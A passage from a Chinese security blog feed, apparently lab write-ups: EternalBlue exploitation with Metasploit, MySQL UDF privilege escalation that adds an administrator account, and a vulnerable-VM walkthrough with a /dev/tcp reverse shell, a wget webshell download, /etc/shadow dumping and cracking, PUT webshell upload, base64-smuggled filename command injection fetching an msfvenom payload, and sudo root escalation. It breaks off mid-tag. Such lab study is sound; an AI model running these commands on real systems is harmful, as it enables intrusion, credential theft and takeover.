class="headerlink" title="上手操作一下"></a>上手操作一下</h2><p>首先需要开启一台win7虚拟机，然后看一下win7的IP地址。<br>打开kali终端输入<code>msfconsole</code>启用metasploit<br>使用搜查ms17-010模块，<code>use auxiliary/scanner/smb/smb_ms17_010 </code><br>设置rhost参数：<code>set rhosts 192.168.xx.xx</code><br>然后<code>run</code><br>就可以查询当前IP是否存在漏洞了。<code>search ms17-010</code><br><img src="https://img-blog.csdnimg.cn/20200701162447397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，这个漏洞是2017年3月14日的。<br>既然存在漏洞了，那就利用这个漏洞来进行提权操作。<br>metasploit下也集成了ms17-010的漏洞利用模块。<code>use exploit/windows/smb/ms17_010_eternalblue</code><br>当然还有其他的模块。下面这个就是win8系统的。现在我的是win7，所以就用上面的这个就行。<br><img src="https://img-blog.csdnimg.cn/20200701163236242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后设置一下rhosts就行了。好像是升级了，居然这么简单。设置好参数后直接使用<code>exploit</code>直接进行提权，等待一会。<br>过程很快的还是。直接输入<code>whoami</code><br>会发现，已经是最高权限登录到win7了<br><img src="https://img-blog.csdnimg.cn/20200701164359235.png" alt="m0re" loading="lazy"><br>成功了。</p><h1 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h1><h2 id="udf介绍"><a href="#udf介绍" class="headerlink" title="udf介绍"></a>udf介绍</h2><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。</p><blockquote><p>在提权过程中，经常使用mysql的udf.dl进行提权。并且提权之前，要上传udf.dll到指定的目录下。使用select@@plugin_dir；或show<br>variables like’plugin%’，查看具体目录。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200701175902929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>修改目录方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、mysqld.exe--plugin-dir=具体目录</span><br><span class="line">2、mysqld.exe--defaults-file=具体目录</span><br><span class="line">3、mysql.ini配置文件plugindir=具体目录</span><br></pre></td></tr></table></figure><h2 id="udf-dll获取"><a href="#udf-dll获取" class="headerlink" title="udf.dll获取"></a>udf.dll获取</h2><p>sqlmap下自带了对应提权使用的udf库。可以直接下载使用，但是sqlmap进行加密，需要解密使用。<br>sqlmap在kali中自带，可以使用下面这个方法。<br>sqlmap在<code>/root/usr/share/sqlmap</code><br>关于UDF则是在<br><img src="https://img-blog.csdnimg.cn/20200701183915508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>因为我的mysql是win32，所以选择32<br>奥，至于查看的话，在mysql命令行中使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@version_compile_os;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200701184210678.png" alt="m0re" loading="lazy"><br>不过这个udf是加密的，不过sqlmap中有解密的脚本，可以直接使用，脚本在extra中的cloak中，<br><img src="https://img-blog.csdnimg.cn/20200701184336892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以使用了，命令为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p>不过我的使用时出问题了，忙着解决，也忘了截图了。我放弃了在linux中解密的方法，我在win7中也有sqlmap，所以我就在win7中解密了，可以成功。<br><img src="https://img-blog.csdnimg.cn/20200701184708439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后在cloak目录下生成了dll文件。<br><img src="https://img-blog.csdnimg.cn/20200701184803670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="上传udf"><a href="#上传udf" class="headerlink" title="上传udf"></a>上传udf</h2><p>将udf.dll文件上传到具体目录下。<br>具体目录上面已经说过查询方法。</p><p>上传方式:<br>利用SQL注入进行上传<code>select load_file() into dumpfile &quot; 具体路径&quot;</code><br>使用菜刀直接上传<br>emmm我直接将文件放在对应目录下了，不演示上传<br><img src="https://img-blog.csdnimg.cn/20200701192730719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="执行提权命令"><a href="#执行提权命令" class="headerlink" title="执行提权命令"></a>执行提权命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">&#x27;udf.dll;</span></span><br><span class="line"><span class="string">select* from mysqlaiunc where name=&#x27;</span>sys_eval<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select sys _eval(&#x27;</span>dir);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sys</span> _eval(<span class="string">&#x27;net user user1 123 /add&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sys</span> _eval(<span class="string">&#x27;net localgroup administrators user1 /add&quot;); </span></span><br><span class="line"><span class="string">drop function sys_eval;</span></span><br></pre></td></tr></table></figure><p>如果出现这样的界面就是对了。<br><img src="https://img-blog.csdnimg.cn/20200701192839480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行下面的步骤就行。<br><img src="https://img-blog.csdnimg.cn/20200701193333804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后会执行dir命令，显示当前目录下的文件。<br>如果电脑中安装有360安全(LM)卫士，会有提示的<br><img src="https://img-blog.csdnimg.cn/20200701193518188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>emmm ,这基本就是MySQL的UDF提权的操作了。学到了好多。</p><p>此次学习到此结束。</p><p>文末寄语：</p><blockquote><p>所有的悲伤，总会留下一丝欢乐的线索。所有的遗憾，总会留下一处完美的角落。我在冰封的深海，找寻希望的缺口。却在午夜惊醒时，蓦然瞥见绝美的月光。——《缺口》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全漏洞靶场演示</title>
      <link href="/2020/08/23/Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA/"/>
      <url>/2020/08/23/Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>一般查看home目录，挖掘用户信息：<code>ls -alh /home</code><br>查看具体用户的目录：<code>ls -alh /home/用户名/</code><br>查看系统信息：<code>uname -a</code><br><img src="https://img-blog.csdnimg.cn/20200814235824608.jpg" alt="m0re" loading="lazy"></p><p>利用ssh命令执行root权限命令<br>使用<code>ssh 用户名@localhost</code>通过ssh登录服务器是不需要身份验证的；<br>比如查看bill用户sudo命令的权限：<code>ssh bill@localhost sudo -l</code><br>ubuntu自带防火墙，所以关闭防火墙方便后面的操作。<br><code>ssh bill@localhost sudo ufw disable</code><br>反弹shell<br>攻击机启动监听netcat<br><code>nc -nlvp 4444</code><br>查看是否nc正在监听<br><code>netstat -pantu</code><br><img src="https://img-blog.csdnimg.cn/20200814235915744.jpg#pic_center" alt="m0re" loading="lazy"></p><p>靶场机器反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@locahost sudo bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后监听端<br><img src="https://img-blog.csdnimg.cn/20200814235942413.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>渗透测试技巧</p><ul><li>开启python简易http服务器<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>利用命令执行下载木马文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@localhost sudo wget <span class="string">&quot;http://[ip]:[port]/shell.jsp&quot;</span> -O /var/lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>不过没有成功<br><img src="https://img-blog.csdnimg.cn/20200815000108253.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2>使用wpscan对用户名进行提取<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url www.vtcsec.com/secret/ --enumerate u</span><br></pre></td></tr></table></figure>探测到一个用户名为admin<br><img src="https://img-blog.csdnimg.cn/20200815000210852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></li></ul><p>使用metasploit进行暴力破解<br><img src="https://img-blog.csdnimg.cn/20200815000303612.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>破解完成，密码admin<br><img src="https://img-blog.csdnimg.cn/20200815000315952.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>登录成功<br><img src="https://img-blog.csdnimg.cn/20200815000340727.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>制作webshell进行上传。</p><p>访问404界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php</span><br></pre></td></tr></table></figure><p>这里再提一下之前的提权，这次这个可以查看shadow文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:!:<span class="number">17484</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">bin:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sys:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">man</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">lp</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">news:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uucp:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">proxy:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">www<span class="literal">-data</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">backup:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">list:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">irc:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">gnats:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd<span class="literal">-timesync</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd<span class="literal">-network</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd<span class="literal">-resolve</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd<span class="literal">-bus</span><span class="literal">-proxy</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">syslog:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_apt:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">messagebus:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uuidd:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lightdm:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">whoopsie:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">avahi<span class="literal">-autoipd</span>:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">avahi:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">dnsmasq:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">colord:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">speech<span class="literal">-dispatcher</span>:!:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">hplip:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">kernoops:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">pulse:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">rtkit:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">saned:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">usbmux:*:<span class="number">17379</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">marlinspike:<span class="variable">$6</span><span class="variable">$wQb5nV3T</span><span class="variable">$xB2WO</span>/jOkbn4t1RUILrckw69LR/<span class="number">0</span>EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:<span class="number">17484</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mysql:!:<span class="number">17486</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sshd:*:<span class="number">17486</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure><p>所以可以进行尝试之前提到的一种提权方式<br>先将两个文件下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download /etc/shadow</span><br><span class="line">[*] Downloading: /etc/shadow -&gt; shadow</span><br><span class="line">[*] Downloaded 1.27 KiB of 1.27 KiB (100.0%): /etc/shadow -&gt; shadow</span><br><span class="line">[*] download   : /etc/shadow -&gt; shadow</span><br><span class="line">meterpreter &gt; download /etc/passwd</span><br><span class="line">[*] Downloading: /etc/passwd -&gt; passwd</span><br><span class="line">[*] Downloaded 2.31 KiB of 2.31 KiB (100.0%): /etc/passwd -&gt; passwd</span><br><span class="line">[*] download   : /etc/passwd -&gt; passwd</span><br></pre></td></tr></table></figure><p>然后逆向一下这两个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; cracked</span><br></pre></td></tr></table></figure><p>然后会发现有了cracked这个文件，在用John进行破解一下，就得到了一个用户名和密码<code>marlinspike</code><br><img src="https://img-blog.csdnimg.cn/20200815000408655.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后登录到一个相对较高的用户，得到一个较高的权限，这个时候，可以使用<code>sudo -l</code><br>查看可以使用的sudo命令。<br>然后发现可以使用<code>sudo bash</code><br>最后得到root权限<br><img src="https://img-blog.csdnimg.cn/20200815000424529.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="命令执行-使用集成工具测试"><a href="#命令执行-使用集成工具测试" class="headerlink" title="命令执行(使用集成工具测试)"></a>命令执行(使用集成工具测试)</h2><p>一个工具，是个坑，不知道什么时候改名字了，原本叫sparta，我找半天没找到，就自己安装，总是定位不到依赖包，尝试了各种方法也没有安装成功。就是因为它改名字了，现在叫legion<br><img src="https://img-blog.csdnimg.cn/20200815000445566.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>感谢那个发现改名的大师傅。<br>其他没什么了。</p><h2 id="中间件PUT漏洞"><a href="#中间件PUT漏洞" class="headerlink" title="中间件PUT漏洞"></a>中间件PUT漏洞</h2><h3 id="中间件介绍"><a href="#中间件介绍" class="headerlink" title="中间件介绍"></a>中间件介绍</h3><p>中间件包括<code>apache、tomcat、IIS、weblogic</code>等，这些中间件可以设置支持的http方法。（HTTP方法包括GET、POST、HEAD、DELETE、PUT、OPTIONS等）<br>每一个HTTP方法都有其对应的功能，在这些方法中，PUT可以直接从客户机上传文件到服务器。如果中间件开放了HTTP中的PUT方法，那么恶意攻击者就可以直接上传webshell到服务器对应的目录。<br>直接上传shell，也可以从侧面反映PUT漏洞的眼中危害性。</p><h3 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h3><p>使用nikto和dirb等工具扫描，除了扫描出来一个test目录，什么也没有；Owasp zap这个漏洞扫描器也没有结果；所以学习一个新工具curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X OPTIONS http://10.0.2.8/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200815000503682.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>利用PUT漏洞获取shell思路：<br>上传webshell到服务器，之后通过对应的目录遍历路径访问webshell，执行webshell。在kali linux中获取反弹shell；<br>上传webshell；在test目录下直接使用浏览器插件poster，上传webshell<br>使用<code>/usr/share/webshells/php/</code>下的webshell<br>使用火狐工具插件RESTClient上传，内容粘贴shell的代码。然后nc监听相应端口；<br><img src="https://img-blog.csdnimg.cn/20200815000703413.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>然后发送，再去浏览器访问这个URL就可以执行shell了；<br>查看nc监听情况。<br>得到shell<br><img src="https://img-blog.csdnimg.cn/20200815000541247.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>找到一个上传页面，而且经过测试只能上传后缀为csv的文件，所以在桌面新建一个<code>1.csv</code>然后使用burpsuite进行抓包修改参数，写入可执行的命令在名称里面。<br>启动监听，使用msfconsole</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.0.2.4</span><br><span class="line">exploit<span class="comment">#开启监听</span></span><br></pre></td></tr></table></figure><p>然后制作shell；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=10.0.2.4 lport=4444 -f elf &gt; /var/www/html/shell</span><br></pre></td></tr></table></figure><p>然后就是绕过防火墙 上传shell<br>利用base64绕过防火墙检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start<span class="comment">#开启apache服务</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;wget http://10.0.2.4/shell -O /tmp/shell&#x27;</span> | base64</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;chmod +x /tmp/shell&#x27;</span> | base64</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;/tmp/shell&#x27;</span> | base64</span><br></pre></td></tr></table></figure><p>使用burpsuite抓包修改参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&lt;?php shell system(base64_decode(&#x27;base64encodestrings&#x27;));die();?&gt;.php&quot;</span></span><br></pre></td></tr></table></figure><p>一步一步的将参数修改上传，最后得到反弹的shell，<br>提升权限；<br>登录服务器后，反弹的shell是www-data用户，并不具备root权限，<br>使用<code>sudo -l</code> 查看www-data用户的sudo权限；<br>根据提示执行以下命令（为了方便，程序员便设置了不需要密码就可以执行的web操作）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e <span class="string">&quot;exec &#x27;/bin/bash&#x27; &quot;</span></span><br><span class="line">bash -i</span><br></pre></td></tr></table></figure><p>就得到了服务器的root用户权限。</p><h2 id="SQL注入-X-Forwarded-For报头注入"><a href="#SQL注入-X-Forwarded-For报头注入" class="headerlink" title="SQL注入-X-Forwarded-For报头注入"></a>SQL注入-X-Forwarded-For报头注入</h2><p>靶场是linux 2.6x的系统，安装虚拟机时注意。<br>然后对靶机进行信息收集，发现了敏感目录，访问是一个登录页面<br>尝试弱口令登录，但是失败了。<br><img src="https://img-blog.csdnimg.cn/20200815000739259.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>放弃使用弱口令，开始进行漏洞扫描，使用AVWS进行漏洞扫描。<br><img src="https://img-blog.csdnimg.cn/2020081500075381.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>配置好，然后开始scan<br>等待结果就可以了<br><img 